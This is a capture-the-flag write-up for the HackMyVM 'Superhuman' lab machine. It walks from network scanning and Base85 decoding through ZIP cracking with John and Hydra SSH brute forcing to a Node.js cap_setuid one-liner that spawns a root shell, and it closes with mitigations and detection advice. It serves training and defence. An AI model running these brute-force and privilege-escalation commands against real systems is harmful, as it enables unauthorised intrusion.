# HackMyVM - Superhuman Writeup

![HackMyVM](images/cover.png)

## Machine Information

| Category | Details |
|----------|----------|
| Platform | HackMyVM |
| Machine | Superhuman |
| Difficulty | Medium |
| Operating System | Linux |
| Author | HackMyVM |
| Attack Path | Web Enumeration → Hidden Files → Base85 Decoding → ZIP Password Cracking → SSH → Linux Capabilities → Privilege Escalation |

---

# Introduction

Today we are solving another **HackMyVM** Linux machine named **Superhuman**.

Unlike most HackMyVM machines, this one does **not display its IP address** on the login banner, requiring us to identify it manually before beginning our assessment. The machine focuses heavily on observation and enumeration rather than immediately exposing an attack surface.

Throughout the assessment we encounter multiple techniques including hidden HTML comments, file fuzzing, encoded data analysis, password-protected ZIP archives, custom password list generation, SSH brute forcing, shell restrictions, and finally privilege escalation through a misconfigured Linux capability assigned to the Node.js binary.

This machine demonstrates that seemingly insignificant clues—such as hidden comments or encoded notes—can eventually lead to complete system compromise when combined with careful enumeration and analysis.

---

# Objectives

The primary objectives during this assessment are:

- Identify the target host.
- Perform network reconnaissance.
- Enumerate exposed services.
- Investigate the web server.
- Discover hidden files.
- Decode hidden messages.
- Recover password-protected archives.
- Obtain SSH credentials.
- Enumerate the Linux environment.
- Escalate privileges to root.

---

# Attack Methodology

The overall attack path followed during this machine is illustrated below.

```
Network Discovery
        │
        ▼
Port Enumeration
        │
        ▼
Web Enumeration
        │
        ▼
Hidden HTML Comment
        │
        ▼
File Fuzzing
        │
        ▼
Base85 Decoding
        │
        ▼
ZIP Archive Discovery
        │
        ▼
ZIP Password Cracking
        │
        ▼
Custom Password List
        │
        ▼
SSH Brute Force
        │
        ▼
User Access
        │
        ▼
Linux Capability Enumeration
        │
        ▼
Node.js Capability Abuse
        │
        ▼
Root Shell
```

---

# Network Discovery

Unlike previous HackMyVM machines, the login banner does not reveal the machine's IP address.

To locate the target, **Netdiscover** is used to identify active hosts on the local network.

```bash
netdiscover -i eth1
```

The scan returns the following hosts.

```
192.168.56.1

192.168.56.100

192.168.56.133
```

After verifying the environment, the target machine is identified as:

```
192.168.56.133
```

### Screenshot

```text
images/01-netdiscover.png
```

```md
![Netdiscover](images/01-netdiscover.png)
```

---

# Initial Port Enumeration

With the target identified, the next step is performing a TCP port scan.

```bash
nmap -p- 192.168.56.133
```

The scan reports only two open services.

| Port | Service |
|------|----------|
|22|SSH|
|80|HTTP|

This significantly reduces the exposed attack surface.

### Screenshot

```md
![Initial Nmap Scan](images/02-nmap-allports.png)
```

---

# Service Enumeration

A more detailed scan is performed using the default NSE scripts together with service detection.

```bash
nmap -sC -sV 192.168.56.133
```

The scan identifies the running software.

| Port | Service | Version |
|------|----------|----------|
|22|OpenSSH|7.9p1 Debian|
|80|Apache|2.4.38 Debian|

The service banner also confirms that the operating system is Linux.

Although nothing immediately appears vulnerable, version enumeration provides useful context for later stages of the assessment.

### Screenshot

```md
![Service Enumeration](images/03-service-scan.png)
```

---

# Web Enumeration

Attention now shifts toward the HTTP service.

Opening the target in the browser reveals something rather unusual.

```
http://192.168.56.133
```

Instead of a web application, login page, or landing page, only a completely blank white page is displayed.

No links.

No forms.

No images.

No visible content.

At first glance the page appears empty, but machines that intentionally present blank pages often hide useful information within the source code.

### Screenshot

```md
![Blank Webpage](images/04-blank-page.png)
```

---

# Directory Enumeration

The next logical step is directory and file enumeration.

Several tools are attempted including:

- Feroxbuster
- Common directory wordlists
- Extension fuzzing

Example command:

```bash
feroxbuster -u http://192.168.56.133
```

Surprisingly, none of these techniques initially reveal anything useful.

This indicates that standard directory brute forcing alone is unlikely to solve the challenge.

---

# Inspecting the Source Code

Since the page itself is empty, the HTML source code is inspected manually.

Scrolling to the very bottom reveals an interesting hidden comment.

```html
<!-- If your eye was sharper, you would see everything in motion, lol -->
```

Although small, this becomes the first meaningful clue.

The wording suggests:

- Something is intentionally hidden.
- Careful observation is required.
- Traditional brute forcing may not be sufficient.

### Screenshot

```md
![Hidden HTML Comment](images/05-source-comment.png)
```

---

# File Enumeration

Instead of continuing to brute force only directories, the focus shifts toward discovering hidden files.

After testing various file extensions, a previously undiscovered resource is identified.

```
notes-tips.txt
```

Browsing directly to:

```
http://192.168.56.133/notes-tips.txt
```

returns a long string of unusual characters.

### Screenshot

```md
![notes-tips.txt](images/06-notes.png)
```

---

# Investigating notes-tips.txt

The contents resemble the following.

```
F(&m'D.Oi#De4!--ZgJT@;^00D.P7@8LJ?tF)N1B@:UuC...
```

At first glance the text appears random.

However, several characteristics stand out.

- Entirely printable characters
- No hexadecimal formatting
- No Base64 padding
- Repeating punctuation
- Consistent character length

These indicators suggest that the data is encoded rather than encrypted.

---

# Decoding the Message

The encoded text is loaded into **CyberChef**.

Several decoding techniques are tested before identifying the correct encoding.

```
Base85
```

After decoding, the original message becomes readable.

```
salome doesn't want me...

I'm sure god is dead...

I drank 6 liters of Paulaner...

I'll write her a poem...

I'll name it salome_and_??

I must not forget to save it and put a good extension because I don't have much storage.
```

### Screenshot

```md
![CyberChef Base85 Decode](images/07-cyberchef.png)
```

---

# Analyzing the Decoded Message

Although the recovered note appears to be nothing more than personal thoughts, it contains several valuable hints.

The message repeatedly references:

- A poem.
- The name **Salome**.
- A filename beginning with **salome_and_**.
- Choosing an appropriate extension.
- Limited storage.

These clues strongly suggest that the poem has been archived inside a compressed file.

The most likely filename becomes:

```
salome_and_me.zip
```

---

# Discovering the ZIP Archive

Attempting to access the guessed filename confirms the suspicion.

```
http://192.168.56.133/salome_and_me.zip
```

The archive downloads successfully.

However, extracting it immediately reveals another obstacle.

The archive is encrypted with a password.

### Screenshot

```md
![ZIP Download](images/08-zip-download.png)
```

---

# Cracking the ZIP Password

Since the ZIP archive is password protected, the password hash is extracted using **zip2john**.

```bash
zip2john salome_and_me.zip > hash
```

The resulting hash is then supplied to **John the Ripper**.

```bash
john hash
```

After processing the default wordlist, John successfully recovers the archive password.

```
turtle
```

### Screenshot

```md
![John the Ripper](images/09-john.png)
```

---

# Extracting the Archive

Using the recovered password, the ZIP archive is extracted.

Inside is a single file.

```
salome_and_me.txt
```

Reading the file reveals a poem written by **fred**, expressing his frustration over being rejected by Salome.

Although the poem initially appears to be irrelevant, every unique word contained within it becomes a potential candidate for password reuse.

This observation will prove critical during the next stage of the assessment.

### Screenshot

```md
![Poem Contents](images/10-poem.png)
```

---

# Building a Custom Password List

Rather than relying on generic password dictionaries, a targeted wordlist is generated directly from the recovered poem.

The following command extracts every unique word while removing punctuation and duplicate entries.

```bash
cat salome_and_me.txt | tr -s '[:space:][:punct:]' '\n' | sort -u > pass.txt
```

This produces a concise dictionary containing only terms that are contextually related to the user, greatly increasing the likelihood of discovering reused credentials.

---

# Brute Forcing SSH Credentials

With the custom password list prepared, **Hydra** is used against the SSH service.

The target username is inferred from the recovered poem.

```
fred
```

Using the generated password list, Hydra successfully identifies valid credentials.

```
Username : fred

Password : schopenhauer
```

At this point, remote access to the system is successfully obtained via SSH.

The next phase focuses on analyzing the unusual shell behavior, bypassing the command restrictions, enumerating Linux capabilities, and exploiting a vulnerable **Node.js** binary to obtain full root privileges.

# User Access

With valid SSH credentials recovered, we can now authenticate to the target system.

```
Username : fred
Password : schopenhauer
```

Connecting through SSH:

```bash
ssh fred@192.168.56.133
```

Authentication succeeds and an interactive shell is presented.

At first glance, everything appears normal. However, this quickly changes once basic enumeration begins.

### Screenshot

```md
![SSH Login](images/11-ssh-login.png)
```

---

# Unexpected Shell Behaviour

As part of the standard post-exploitation process, the first command executed is:

```bash
ls
```

Surprisingly, instead of listing the contents of the current directory, the SSH session immediately terminates.

After reconnecting, the same behavior occurs every time the `ls` command is executed.

This indicates that the environment has been intentionally modified to interfere with normal enumeration.

Such techniques are sometimes referred to as **shell traps**, where commonly used commands are replaced or aliased to custom programs that intentionally disrupt the attacker's workflow.

---

# Enumerating Without ls

Since `ls` cannot be used safely, alternative commands are used for navigation and enumeration.

Commands such as:

```bash
pwd
```

```bash
cat
```

```bash
find
```

continue to function normally.

Eventually, the user flag is located.

```bash
cat user.txt
```

Output:

```
Ineedmorepower
```

### Screenshot

```md
![User Flag](images/12-user-flag.png)
```

---

# Investigating the Shell Trap

Further investigation reveals an unusual file named:

```
lol
```

Additionally, another file hints that the traditional `ls` command has effectively been replaced.

The message states:

```
"ls" command has a new name?!! WTF!
```

This confirms that the abnormal behavior is intentional.

Rather than relying on exploitation, the challenge simply forces the user to avoid using the standard `ls` command and instead utilize alternative Linux utilities for filesystem enumeration.

Although this shell trap is not a privilege escalation vulnerability, it serves as an obstacle designed to test familiarity with Linux command-line tools.

---

# Linux Enumeration

After obtaining the user flag, the next objective is privilege escalation.

A standard Linux enumeration process begins.

Rather than immediately running automated scripts, manual enumeration is performed to identify potentially dangerous system configurations.

One particularly useful command is:

```bash
/usr/sbin/getcap -r / 2>/dev/null
```

This recursively searches the filesystem for binaries possessing Linux capabilities.

### Screenshot

```md
![Linux Capabilities](images/13-getcap.png)
```

---

# Understanding Linux Capabilities

Linux capabilities divide the traditional root privileges into smaller, more specific permissions.

Instead of granting an application full root access through the SUID bit, administrators may assign only the privileges required by a program.

Examples include:

- Network administration
- Raw socket access
- Mount operations
- UID manipulation

Although capabilities improve security when configured correctly, improper assignments can create powerful privilege escalation opportunities.

---

# Capability Enumeration Results

The command reveals two capability-enabled binaries.

```
/usr/bin/ping = cap_net_raw+ep

/usr/bin/node = cap_setuid+ep
```

The first entry is expected.

```
ping

↓

cap_net_raw
```

This capability allows ICMP packets without full root privileges.

The second finding is significantly more interesting.

```
node

↓

cap_setuid
```

This capability immediately stands out as a potential privilege escalation vector.

---

# Understanding cap_setuid

The capability:

```
cap_setuid
```

allows a process to change its effective user ID.

Normally:

```
Only root

↓

Can execute

setuid(0)
```

However, if a binary possesses:

```
cap_setuid+ep
```

it may call:

```c
setuid(0)
```

without already being root.

This effectively allows the process to become the root user.

Assigning this capability to an interpreter such as **Node.js** is particularly dangerous because it enables arbitrary JavaScript execution with elevated privileges.

---

# Exploiting Node.js

Node.js provides direct access to the operating system through JavaScript.

Using the following one-liner:

```bash
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'
```

the process performs two actions.

First:

```
process.setuid(0)
```

changes the effective UID to root.

Second:

```
spawn("/bin/bash")
```

launches an interactive Bash shell while inheriting the current input and output streams.

Since the Node.js binary already possesses the required capability, the shell is started with full root privileges.

### Screenshot

```md
![Node Exploit](images/14-node-root.png)
```

---

# Root Access

After executing the exploit, the shell prompt immediately changes.

```
root@superhuman:/opt#
```

Privilege escalation has been completed successfully.

Verifying the current user confirms the compromise.

```bash
id
```

Output:

```
uid=0(root)
```

### Screenshot

```md
![Root Shell](images/15-root-shell.png)
```

---

# Root Flag

The final objective is retrieving the root flag.

```bash
cat /root/root.txt
```

Output:

```
Imthesuperhuman
```

The machine has now been fully compromised.

### Screenshot

```md
![Root Flag](images/16-root-flag.png)
```

---

# Complete Attack Chain

```
Netdiscover
        │
        ▼
Nmap Enumeration
        │
        ▼
Blank Web Page
        │
        ▼
Hidden HTML Comment
        │
        ▼
File Fuzzing
        │
        ▼
notes-tips.txt
        │
        ▼
Base85 Decode
        │
        ▼
Recover ZIP Filename
        │
        ▼
Password-Protected Archive
        │
        ▼
John the Ripper
        │
        ▼
Extract Poem
        │
        ▼
Generate Custom Wordlist
        │
        ▼
Hydra SSH Attack
        │
        ▼
User Access (fred)
        │
        ▼
Shell Trap Analysis
        │
        ▼
Capability Enumeration
        │
        ▼
Node.js cap_setuid Abuse
        │
        ▼
Root Shell
```

---

# Vulnerabilities Identified

## 1. Hidden Sensitive Information

The web application exposed encoded information that could be recovered through basic analysis.

### Impact

- Information disclosure
- Exposure of internal filenames
- Attack path discovery

### Mitigation

- Remove unnecessary files from production environments.
- Restrict access to development artifacts.
- Regularly audit publicly accessible resources.

---

## 2. Password-Protected Archive with Weak Password

Although the archive was encrypted, the password was easily recovered using a dictionary attack.

### Impact

- Disclosure of confidential information.
- Credential discovery.

### Mitigation

- Use strong, randomly generated passwords.
- Avoid predictable or dictionary-based archive passwords.

---

## 3. Password Reuse

The poem provided enough context to generate a targeted password list, ultimately revealing valid SSH credentials.

### Impact

- Unauthorized SSH access.
- User account compromise.

### Mitigation

- Enforce strong password policies.
- Prevent password reuse.
- Enable MFA where possible.

---

## 4. Dangerous Linux Capability Assignment

The most critical vulnerability was assigning:

```
cap_setuid+ep
```

to the Node.js binary.

### Impact

- Local privilege escalation.
- Complete system compromise.
- Root shell acquisition.

### Mitigation

- Remove unnecessary capabilities.
- Avoid assigning privileged capabilities to scripting language interpreters.
- Periodically audit system capabilities using `getcap`.

---

# MITRE ATT&CK Mapping

| Technique | ATT&CK ID |
|------------|-----------|
| Active Scanning | T1595 |
| Gather Victim Identity Information | T1589 |
| Brute Force | T1110 |
| Valid Accounts | T1078 |
| Abuse Elevation Control Mechanism | T1548 |
| Command and Scripting Interpreter | T1059 |

---

# Detection Opportunities

Security teams should monitor for:

- Excessive directory and file enumeration requests.
- Access to hidden files and development artifacts.
- Repeated archive password guessing.
- Multiple SSH authentication failures.
- Execution of `getcap` by non-administrative users.
- Unexpected execution of Node.js spawning privileged shells.
- Unusual capability assignments on system binaries.

Centralized logging, auditd rules, and Endpoint Detection and Response (EDR) solutions can significantly improve visibility into these behaviors.

---

# Security Recommendations

To reduce the attack surface:

- Remove hidden development files before deployment.
- Avoid exposing encoded notes or internal documentation.
- Enforce strong archive passwords.
- Require unique passwords for all user accounts.
- Enable multi-factor authentication for SSH.
- Audit Linux capabilities regularly.
- Avoid assigning `cap_setuid` to scripting interpreters.
- Apply the principle of least privilege across all services.

---

# Lessons Learned

The **Superhuman** machine demonstrates how a complete compromise can be achieved by chaining together multiple seemingly minor weaknesses. An exposed encoded note revealed clues to a hidden archive, which in turn contained information that enabled targeted password attacks against an SSH account. After obtaining user access, a deliberately modified shell environment tested familiarity with alternative Linux commands rather than standard enumeration techniques. The final privilege escalation relied on a misconfigured Linux capability assigned to the Node.js interpreter, illustrating how improper capability management can be just as dangerous as traditional SUID misconfigurations.

This challenge reinforces the importance of thorough enumeration, careful analysis of hidden information, and a strong understanding of Linux privilege management.

---

# Conclusion

**Superhuman** is an excellent HackMyVM machine that combines web enumeration, encoding analysis, password cracking, Linux post-exploitation, and privilege escalation into a realistic attack chain. Rather than relying on a single vulnerability, it rewards methodical investigation and demonstrates how information disclosure, weak credentials, and insecure capability assignments can ultimately lead to complete system compromise.

The machine provides valuable hands-on experience with modern Linux privilege escalation techniques while emphasizing the importance of secure configuration, least privilege, and comprehensive system hardening.
